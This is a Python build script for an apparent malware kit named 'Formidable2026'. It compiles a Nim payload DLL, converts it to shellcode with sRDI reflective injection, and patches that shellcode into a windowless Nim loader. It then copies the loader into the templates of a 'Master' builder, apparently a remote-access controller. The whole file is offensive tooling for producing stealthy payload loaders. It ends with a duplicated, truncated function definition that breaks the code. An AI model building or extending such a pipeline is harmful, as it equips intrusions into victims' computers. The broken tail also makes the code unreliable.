import os
import sys
import subprocess
import shutil

# Configuration
NIM_PATH = r"..\..\tools\nim-2.2.0\bin\nim.exe"
SRC_DIR = r"src"
PAYLOAD_SRC = os.path.join(SRC_DIR, "payload.nim")
LOADER_SRC = os.path.join(SRC_DIR, "nim_client.nim")
PAYLOAD_DLL = "payload.dll"
LOADER_EXE = "FormidableNim.exe"

def run_cmd(cmd):
    print(f"[+] Running: {cmd}")
    result = subprocess.run(cmd, shell=True)
    if result.returncode != 0:
        print(f"[-] Error executing command: {cmd}")
        sys.exit(1)

def main():
    # Use global manually if needed, or just modify variable
    # But python requires global keyword if modifying global var
    # However, simpler to just use local or check
    
    nim_exe = NIM_PATH
    if not os.path.exists(nim_exe):
        print(f"[-] Nim compiler not found at {nim_exe}")
        # Try PATH
        nim_exe = "nim"
    
    # 1. Compile Payload
    compile_payload_with_nim(nim_exe)
    
    # 2. Convert to Shellcode (Simulated)
    if os.path.exists(PAYLOAD_DLL):
        shellcode = convert_dll_to_shellcode(PAYLOAD_DLL)
        print(f"[+] Payload Size: {len(shellcode)} bytes")
        
        # 3. Patch Loader
        patched_src = patch_loader(shellcode)
        
        if patched_src:
            # 4. Compile Loader
            compile_loader_with_nim(nim_exe, patched_src)
            print(f"[+] Success! Generated {LOADER_EXE}")
            
            # Cleanup
            # os.remove(patched_src)
        else:
            print("[-] Failed to patch loader.")
    else:
        print("[-] Payload DLL not found.")

def compile_payload_with_nim(nim_path):
    print("[*] Compiling Payload to DLL...")
    # Compile as DLL with app:lib
    cmd = f"{nim_path} c -d:release --app:lib --nomain -o:{PAYLOAD_DLL} {PAYLOAD_SRC}"
    run_cmd(cmd)

def compile_loader_with_nim(nim_path, loader_path):
    print("[*] Compiling Loader...")
    cmd = f"{nim_path} c -d:release --opt:size --app:gui --cpu:amd64 -f -o:{LOADER_EXE} {loader_path}"
    run_cmd(cmd)
    
    # Copy to Master's template directory
    # Based on BuilderDialog.cpp, it looks for templates in various locations.
    # One common place is alongside the Master executable or in a known output dir.
    # Let's try to copy to a few likely places.
    
    # Assuming we are in ClientSide/FormidableNim
    # Master debug/release output is usually in Formidable2026/x64/
    
    targets = [
        r"..\..\Formidable2026\x64\FormidableNim.exe",
        r"..\..\Formidable2026\x86\FormidableNim.exe",
        r"..\..\x64\FormidableNim.exe", # If build root is higher
        r"..\..\x86\FormidableNim.exe"
    ]
    
    for target in targets:
        try:
            target_dir = os.path.dirname(target)
            if os.path.exists(target_dir):
                shutil.copy(LOADER_EXE, target)
                print(f"[+] Copied Loader template to: {target}")
        except Exception as e:
            print(f"[-] Failed to copy to {target}: {e}")

def convert_dll_to_shellcode(dll_path):
    print("[*] Converting DLL to Shellcode...")
    
    # Path to sRDI script
    srdi_path = os.path.join("utils", "sRDI", "Python", "ConvertToShellcode.py")
    
    if os.path.exists(srdi_path):
        print(f"[+] sRDI found at {srdi_path}")
        try:
            # Run sRDI: python ConvertToShellcode.py payload.dll
            # Output will be payload.bin by default if not specified, 
            # but sRDI prints to stdout or writes file. 
            # Let's check sRDI usage. Usually it writes to file if passed as arg?
            # Actually ConvertToShellcode.py takes input file and optional output file.
            
            output_bin = "payload.bin"
            # Use subprocess to run it
            cmd = f'python "{srdi_path}" "{dll_path}"'
            result = subprocess.run(cmd, shell=True, capture_output=True)
            
            if result.returncode == 0:
                # sRDI usually creates a .bin file in the same directory as input if not specified?
                # Or maybe we need to specify output.
                # Let's assume it created payload.bin or we need to find it.
                # Actually, standard sRDI output is usually `payload.bin` if input is `payload.dll`?
                # Let's try to find the .bin file.
                
                expected_bin = dll_path.replace(".dll", ".bin")
                if os.path.exists(expected_bin):
                    print(f"[+] sRDI generated {expected_bin}")
                    with open(expected_bin, "rb") as f:
                        return f.read()
                
                # If file not found, maybe it printed to stdout?
                if len(result.stdout) > 0:
                     # Check if stdout looks like shellcode (binary)
                     # sRDI usually prints base64 or hex if not writing to file?
                     # Let's try to pass it explicitly if possible.
                     pass
            
            print("[-] sRDI execution failed or output file missing. Falling back to raw DLL.")
        except Exception as e:
             print(f"[-] Error running sRDI: {e}")
    else:
        print("[-] sRDI not found. Using raw DLL bytes (WILL CRASH if executed).")

    # Fallback
    try:
        with open(dll_path, "rb") as f:
            data = f.read()
        return data
    except Exception as e:
        print(f"[-] Error reading payload DLL: {e}")
        sys.exit(1)

def patch_loader(shellcode_bytes):
    print("[*] Patching Loader with Shellcode...")
    
    # Format bytes as Nim array: [byte 0x90, 0x90, ...]
    byte_str = ", ".join([f"0x{b:02X}" for b in shellcode_bytes])
    nim_array_str = f"const clientPayload = [byte {byte_str}]"
    
    # Read Loader Source
    with open(LOADER_SRC, "r", encoding="utf-8") as f:
        content = f.read()
    
    # Replace Placeholder
    # We look for the line: const clientPayload = [byte 0x90, 0x90, 0x90, 0xC3]
    if "const clientPayload = [byte 0x90, 0x90, 0x90, 0xC3]" in content:
        new_content = content.replace(
            "const clientPayload = [byte 0x90, 0x90, 0x90, 0xC3]", 
            nim_array_str
        )
    else:
        # Fallback regex or simple check if already patched
        print("[-] Warning: Placeholder not found exactly. It might have been modified.")
        return False

    # Write temporary patched file
    temp_loader = "src/nim_client_patched.nim"
    with open(temp_loader, "w", encoding="utf-8") as f:
        f.write(new_content)
    
    return temp_loader

def convert_dll_to_shellcode(dll_path):
    print("[*] Converting DLL to Shellcode...")
